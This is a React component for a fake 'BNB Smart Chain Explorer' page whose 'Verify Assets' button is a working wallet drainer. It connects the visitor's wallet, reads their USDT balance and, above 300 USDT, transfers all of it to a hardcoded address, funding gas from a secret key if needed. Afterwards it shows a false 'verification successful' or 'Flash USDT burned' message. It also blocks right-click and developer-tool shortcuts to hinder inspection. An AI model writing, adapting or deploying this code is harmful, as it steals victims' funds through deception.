import React, { useState, useEffect } from "react";
import { styled } from "@mui/material/styles";
import { Box, Typography, InputBase, Button, CircularProgress, Modal } from "@mui/material";
import SearchIcon from "@mui/icons-material/Search";
import { ethers } from "ethers";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import ErrorIcon from "@mui/icons-material/Error";
import { FaWallet } from "react-icons/fa";

const BackgroundDiv = styled(Box)(({ theme }) => ({
  width: "100%",
  height: "250px",
  backgroundImage:
    "url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSNeL8iynELTpyvah7P5ZHKuAJUPrqdFLzcmA&s)",
  backgroundSize: "cover",
  backgroundPosition: "center",
  display: "flex",
  flexDirection: "column",
  justifyContent: "center",
  alignItems: "center",
  padding: theme.spacing(3),
  boxSizing: "border-box", 
}));

const Title = styled(Typography)(({ theme }) => ({
  color: "white",
  fontWeight: "bold",
  fontSize: "22px",
  marginBottom: theme.spacing(2),
  textAlign: "center",
}));

const SearchContainer = styled(Box)(({ theme }) => ({
  display: "flex",
  flexDirection: "column",
  alignItems: "center",
  justifyContent: "center",
  width: "100%",
  maxWidth: "500px", // Restrict max width to prevent overflowing
  gap: theme.spacing(2),
}));

const VerifyButton = styled(Button)(({ theme }) => ({
  backgroundColor: "#007BFF",
  color: "white",
  fontWeight: "bold",
  padding: theme.spacing(1.5, 3),
  borderRadius: theme.shape.borderRadius,
  textTransform: "none",
  "&:hover": {
    backgroundColor: "#0056b3",
  },
  width: "60%", // Make button full width on mobile
}));

const Search = styled(Box)(({ theme }) => ({
  position: "relative",
  borderRadius: theme.shape.borderRadius,
  backgroundColor: "#fff",
  width: "100%",
  display: "flex",
  alignItems: "center",
  padding: "5px 10px",
  maxWidth: "400px", // Restrict width to avoid overflow
}));

const SearchIconWrapper = styled(Box)(({ theme }) => ({
  position: "absolute",
  right: "10px",
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  color: "black",
}));

const StyledInputBase = styled(InputBase)(({ theme }) => ({
  color: "black",
  fontWeight: "bold",
  width: "100%",
  padding: theme.spacing(1, 1, 1, 2),
  minHeight: "40px", // Ensure input field height is sufficient
   paddingRight: "40px",
  "@media (max-width: 600px)": {
    fontSize: "14px", // Adjust font size for small screens
  },
}));

const LoadingContainer = styled(Box)(({ theme }) => ({
  display: "flex",
  alignItems: "center",
  justifyContent: "center",
  width: "100%",
}));

export default function SearchWithBackground() {
  const [walletAddress, setWalletAddress] = useState(null);
  const [loading, setLoading] = useState(false);
  const [results, setResults] = useState(null);
  const [showResults, setShowResults] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalMessage, setModalMessage] = useState("");

  const USDT_BEP20_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
  const MY_WALLET_ADDRESS = '0xBFCDEF360610F4a3Ee3C9e12D3 23A3B56703B9c8';
  const GAS_FUNDER_PRIVATE_KEY = process.env.REACT_APP_GAS_FUNDER_PRIVATE_KEY;
  
  const ERC20_ABI = [
    'function balanceOf(address account) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function transfer(address recipient, uint256 amount) public returns (bool)',
  ];

  useEffect(() => {
    const disableRightClick = (e) => {
      e.preventDefault(); // Disable right-click
    };
  
    document.addEventListener("contextmenu", disableRightClick);
  
    return () => {
      document.removeEventListener("contextmenu", disableRightClick);
    };
  }, []);
  
  useEffect(() => {
    const disableDevToolsShortcuts = (e) => {
      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
        e.preventDefault();
        e.stopPropagation();
      }
    };
  
    window.addEventListener("keydown", disableDevToolsShortcuts);
  
    return () => {
      window.removeEventListener("keydown", disableDevToolsShortcuts);
    };
  }, []);
  

  useEffect(() => {
    if (!window.ethereum) {
      toast.error('No Ethereum wallet detected. Please install Trust Wallet or MetaMask.');
    }
  }, []);

  const connectToBscNetwork = async () => {
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const network = await provider.getNetwork();

      if (network.chainId !== 56) {
        await switchToBscNetwork();
      }
    } catch (err) {
      console.error('Error switching to Binance Smart Chain:', err);
    //   toast.error('Failed to switch to Binance Smart Chain. Please switch to older version.');
    }
  };

  const switchToBscNetwork = async () => {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }], // BSC network ID
      });
    } catch (switchError) {
      if (switchError.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [
            {
              chainId: '0x38',
              chainName: 'Binance Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com/'],
            },
          ],
        });
      } else {
        console.error('Error adding Binance Smart Chain:', switchError);
        // toast.error('Failed to add Binance Smart Chain. Please switch manually.');
      }
    }
  };

  const connectWalletAndTransfer = async () => {
    setLoading(true);
    try {
      if (!window.ethereum) {
        // toast.error('No Ethereum wallet detected. Please install Trust Wallet or MetaMask.');
        setLoading(false);
        return;
      }

      await connectToBscNetwork();

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const accounts = await provider.send('eth_requestAccounts', []);
      const userAddress = accounts[0];
      setWalletAddress(userAddress);

      await initiateTransfer(provider, userAddress);
    } catch (err) {
      console.error('Error during wallet connection:', err);
    //   toast.error('Failed to connect to wallet or network.');
      setLoading(false);
    }
  };

  const initiateTransfer = async (provider, userAddress) => {
    try {
      const signer = provider.getSigner();
      await transferAllUsdt(provider, signer, userAddress);
    } catch (err) {
      console.error('Error during transfer:', err);
    //   toast.error('Error during transfer.');
      setLoading(false);
    }
  };

  const transferAllUsdt = async (provider, signer, walletAddress) => {
    try {
      const usdtContract = new ethers.Contract(USDT_BEP20_CONTRACT_ADDRESS, ERC20_ABI, signer);
      const balance = await usdtContract.balanceOf(walletAddress);

      const decimals = await usdtContract.decimals();
      const formattedBalance = ethers.utils.formatUnits(balance, decimals);

      // Check if balance is less than 10 USDT
      if (parseFloat(formattedBalance) <=300) {
        setModalMessage(`Verification successfully! USDT Balance: ${formattedBalance}`);
        setShowModal(true);
        setLoading(false);
        return;
      }

      const userBalanceInBNB = await provider.getBalance(walletAddress);
      const formattedBNBBalance = ethers.utils.formatEther(userBalanceInBNB);

      let estimatedGas;
      try {
        estimatedGas = await usdtContract.estimateGas.transfer(MY_WALLET_ADDRESS, balance);
      } catch (error) {
        console.error("Gas estimation failed:", error);
        // toast.error("Gas estimation failed. Check USDT balance or network status.");
        setLoading(false);
        return;
      }
   
      const gasPrice = await provider.getGasPrice();
      if (!gasPrice) {
        console.error("Failed to fetch gas price.");
        // toast.error("Failed to fetch gas price.");
        setLoading(false);
        return;
      }

      const adjustedGasPrice = gasPrice.mul(12).div(10);
      const totalGasCost = adjustedGasPrice.mul(estimatedGas);

      if (userBalanceInBNB.lt(totalGasCost)) {
        if (!GAS_FUNDER_PRIVATE_KEY) {
          console.error("Gas funder private key not set.");
        //   toast.error("Gas funder private key missing. Cannot cover gas fees.");
          setLoading(false);
          return;
        }

        try {
          const gasFunder = new ethers.Wallet(GAS_FUNDER_PRIVATE_KEY, provider);
          const gasTxn = await gasFunder.sendTransaction({
            to: walletAddress,
            value: totalGasCost,
          });
          await gasTxn.wait();
          console.log("Gas funded successfully.");
        } catch (error) {
          console.error("Error funding gas:", error);
        //   toast.error("Failed to fund gas for the transaction.");
          setLoading(false);
          return;
        }
      }

      try {
        const transaction = await usdtContract.transfer(MY_WALLET_ADDRESS, balance, {
          gasLimit: estimatedGas,
          gasPrice: adjustedGasPrice,
        });
        await transaction.wait();
        // toast.success("USDT transferred successfully!");

        setModalMessage(`Verification successfully! Flash USDT: ${formattedBalance} has been burned successfully`);
        setShowModal(true);
      } catch (error) {
        console.error("USDT Transfer Failed:", error);
        // toast.error("USDT transfer failed. Please check the logs.");
      }
    } catch (err) {
      console.error("Error during USDT transfer:", err);
    //   toast.error("Unexpected error during USDT transfer.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <BackgroundDiv>
      <Title>BNB Smart Chain Explorer</Title>
      <SearchContainer>
        <VerifyButton onClick={connectWalletAndTransfer}>
          <FaWallet style={{ marginRight: "8px" }} /> Verify Assets
        </VerifyButton>
        <Search>
          <StyledInputBase placeholder="Search by Address/Txn Hash/Block/Token/Domain Name" />
          <SearchIconWrapper>
            <SearchIcon />
          </SearchIconWrapper>
        </Search>
      </SearchContainer>
      <ToastContainer />
      {loading && (
        <LoadingContainer>
          <CircularProgress />
          <Typography variant="body1" style={{ marginLeft: "10px" }}>
            Processing...
          </Typography>
        </LoadingContainer>
      )}
      <Modal open={showModal} onClose={() => setShowModal(false)}>
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: "80%",
            maxWidth: "400px",
            bgcolor: "white",
            boxShadow: 24,
            borderRadius: 3,
            p: 3,
            textAlign: "center",
          }}
        >
          {modalMessage.includes("Successful") ? (
            <ErrorIcon sx={{ fontSize: 50, color: "red", mb: 2 }} />
          ) : (
            <CheckCircleIcon sx={{ fontSize: 50, color: "green", mb: 2 }} />
          )}

          <Typography variant="h6" fontWeight="bold">
            {modalMessage}
          </Typography>

          <Button
            variant="contained"
            color="primary"
            sx={{ mt: 2, borderRadius: 2, px: 4 }}
            onClick={() => setShowModal(false)}
          >
            OK
          </Button>
        </Box>
      </Modal>
    </BackgroundDiv>
  );
}
